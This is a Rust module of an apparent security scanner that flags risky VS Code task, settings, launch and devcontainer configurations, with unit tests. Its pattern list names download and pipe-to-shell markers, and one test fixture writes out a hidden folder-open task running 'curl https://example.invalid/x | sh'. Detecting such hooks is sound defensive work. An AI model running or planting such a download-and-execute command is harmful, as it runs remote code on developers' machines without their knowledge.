use super::{MetadataAnalysis, bounded};
use crate::model::{Confidence, Finding, Severity};
use serde_json::Value;

pub fn analyze(path: &str, name: &str, text: &str) -> MetadataAnalysis {
    let value: Value = match json5::from_str(text) {
        Ok(value) => value,
        Err(error) => {
            return MetadataAnalysis {
                findings: vec![Finding {
                    id: "CONFIG-PARSE-FAILED".to_owned(),
                    severity: Severity::Medium,
                    confidence: Confidence::VeryHigh,
                    score: 45,
                    title: "Developer-tool configuration could not be parsed".to_owned(),
                    message:
                        "A security-relevant IDE or devcontainer file is malformed or unsupported."
                            .to_owned(),
                    file: Some(path.to_owned()),
                    line: None,
                    evidence: vec![error.to_string()],
                }],
                incomplete_reasons: vec![format!(
                    "could not parse developer-tool configuration {path}: {error}"
                )],
                ..MetadataAnalysis::default()
            };
        }
    };
    match name {
        "tasks.json" => analyze_tasks(path, text, &value),
        "settings.json" => analyze_settings(path, text, &value),
        "launch.json" => analyze_launch(path, text, &value),
        "devcontainer.json" => analyze_devcontainer(path, text, &value),
        _ => MetadataAnalysis::default(),
    }
}

fn analyze_tasks(path: &str, text: &str, value: &Value) -> MetadataAnalysis {
    let mut analysis = MetadataAnalysis::default();
    let Some(tasks) = value.get("tasks").and_then(Value::as_array) else {
        return analysis;
    };
    for task in tasks {
        let run_on_open =
            task.pointer("/runOptions/runOn").and_then(Value::as_str) == Some("folderOpen");
        if !run_on_open {
            continue;
        }
        let command = command_text(task.get("command"));
        let dangerous = command.as_deref().is_some_and(download_or_shell_chain);
        let hidden = task.pointer("/presentation/reveal").and_then(Value::as_str) == Some("never");
        let label = task
            .get("label")
            .and_then(Value::as_str)
            .unwrap_or("unnamed task");
        let mut evidence = vec![format!("task: {label}"), "runOn: folderOpen".to_owned()];
        if let Some(command) = command {
            evidence.push(format!("command: {}", bounded(&command)));
        }
        if hidden {
            evidence.push("terminal reveal: never".to_owned());
        }
        analysis.findings.push(Finding {
            id: if dangerous {
                "IDE-FOLDER-OPEN-DOWNLOAD-EXECUTE"
            } else {
                "IDE-FOLDER-OPEN-TASK"
            }
            .to_owned(),
            severity: if dangerous {
                Severity::Critical
            } else {
                Severity::High
            },
            confidence: Confidence::VeryHigh,
            score: if dangerous { 97 } else { 85 },
            title: if dangerous {
                "Repository downloads or executes content when opened"
            } else {
                "Repository task runs automatically when opened"
            }
            .to_owned(),
            message: "A VS Code folder-open task can execute repository-controlled commands before the developer intentionally runs the project."
                .to_owned(),
            file: Some(path.to_owned()),
            line: find_line(text, "folderOpen"),
            evidence,
        });
    }
    analysis
}

fn analyze_settings(path: &str, text: &str, value: &Value) -> MetadataAnalysis {
    let mut analysis = MetadataAnalysis::default();
    if value
        .get("task.allowAutomaticTasks")
        .and_then(Value::as_str)
        == Some("on")
    {
        analysis.findings.push(Finding {
            id: "IDE-AUTOMATIC-TASKS".to_owned(),
            severity: Severity::High,
            confidence: Confidence::VeryHigh,
            score: 80,
            title: "Repository enables automatic tasks".to_owned(),
            message: "Workspace settings allow tasks to run automatically.".to_owned(),
            file: Some(path.to_owned()),
            line: find_line(text, "task.allowAutomaticTasks"),
            evidence: vec!["task.allowAutomaticTasks: on".to_owned()],
        });
    }
    for section in ["files.exclude", "search.exclude"] {
        let Some(exclusions) = value.get(section).and_then(Value::as_object) else {
            continue;
        };
        for (pattern, enabled) in exclusions {
            if enabled.as_bool() == Some(true) && hides_security_path(pattern) {
                analysis.findings.push(Finding {
                    id: "IDE-HIDDEN-SECURITY-FILES".to_owned(),
                    severity: Severity::High,
                    confidence: Confidence::High,
                    score: 75,
                    title: "Workspace settings hide security-relevant files".to_owned(),
                    message: "Explorer or search exclusions conceal developer-tool or configuration files."
                        .to_owned(),
                    file: Some(path.to_owned()),
                    line: find_line(text, pattern),
                    evidence: vec![format!("{section}: {pattern}")],
                });
            }
        }
    }
    analysis
}

fn analyze_launch(path: &str, text: &str, value: &Value) -> MetadataAnalysis {
    let mut analysis = MetadataAnalysis::default();
    let Some(configurations) = value.get("configurations").and_then(Value::as_array) else {
        return analysis;
    };
    for configuration in configurations {
        let Some(task) = configuration.get("preLaunchTask").and_then(Value::as_str) else {
            continue;
        };
        analysis.findings.push(Finding {
            id: "IDE-PRELAUNCH-TASK".to_owned(),
            severity: Severity::Informational,
            confidence: Confidence::VeryHigh,
            score: 10,
            title: "Debug configuration invokes a repository task".to_owned(),
            message: "Starting this debug configuration triggers a named workspace task."
                .to_owned(),
            file: Some(path.to_owned()),
            line: find_line(text, "preLaunchTask"),
            evidence: vec![format!("preLaunchTask: {task}")],
        });
    }
    analysis
}

fn analyze_devcontainer(path: &str, text: &str, value: &Value) -> MetadataAnalysis {
    let mut analysis = MetadataAnalysis::default();
    for key in [
        "initializeCommand",
        "onCreateCommand",
        "updateContentCommand",
        "postCreateCommand",
        "postStartCommand",
        "postAttachCommand",
    ] {
        let Some(command) = command_text(value.get(key)) else {
            continue;
        };
        analysis.findings.push(Finding {
            id: "DEVCONTAINER-EXECUTION-HOOK".to_owned(),
            severity: Severity::High,
            confidence: Confidence::VeryHigh,
            score: 75,
            title: "Devcontainer configuration contains an execution hook".to_owned(),
            message: "Opening or creating the development container can execute repository-controlled commands."
                .to_owned(),
            file: Some(path.to_owned()),
            line: find_line(text, key),
            evidence: vec![format!("{key}: {}", bounded(&command))],
        });
    }
    analysis
}

fn command_text(value: Option<&Value>) -> Option<String> {
    match value? {
        Value::String(command) => Some(command.to_owned()),
        Value::Array(parts) => Some(
            parts
                .iter()
                .filter_map(Value::as_str)
                .collect::<Vec<_>>()
                .join(" "),
        ),
        Value::Object(commands) => Some(
            commands
                .values()
                .filter_map(Value::as_str)
                .collect::<Vec<_>>()
                .join(" "),
        ),
        _ => None,
    }
}

fn download_or_shell_chain(command: &str) -> bool {
    let command = command.to_ascii_lowercase();
    let download = ["curl ", "wget ", "invoke-webrequest", "iwr "]
        .iter()
        .any(|marker| command.contains(marker));
    let execute = [
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "invoke-expression",
        "iex ",
        "powershell",
        "pwsh",
    ]
    .iter()
    .any(|marker| command.contains(marker));
    download && execute
}

fn hides_security_path(pattern: &str) -> bool {
    let pattern = pattern.to_ascii_lowercase();
    [
        ".vscode",
        ".devcontainer",
        "package.json",
        "vite.config",
        "webpack.config",
        "tailwind.config",
    ]
    .iter()
    .any(|value| pattern.contains(value))
}

fn find_line(text: &str, needle: &str) -> Option<u64> {
    text.lines()
        .position(|line| line.contains(needle))
        .map(|line| line as u64 + 1)
}

#[cfg(test)]
mod tests {
    use super::{analyze_settings, analyze_tasks};

    #[test]
    fn detects_folder_open_download_and_execute() {
        let text = r#"{
            tasks: [{
                label: "setup",
                command: "curl https://example.invalid/x | sh",
                runOptions: { runOn: "folderOpen" },
                presentation: { reveal: "never" }
            }]
        }"#;
        let value = json5::from_str(text).unwrap();
        let analysis = analyze_tasks(".vscode/tasks.json", text, &value);
        assert_eq!(
            analysis.findings[0].severity,
            crate::model::Severity::Critical
        );
    }

    #[test]
    fn detects_hidden_vscode_configuration() {
        let text = r#"{"files.exclude":{".vscode":true}}"#;
        let value = serde_json::from_str(text).unwrap();
        let analysis = analyze_settings(".vscode/settings.json", text, &value);
        assert_eq!(analysis.findings[0].id, "IDE-HIDDEN-SECURITY-FILES");
    }
}
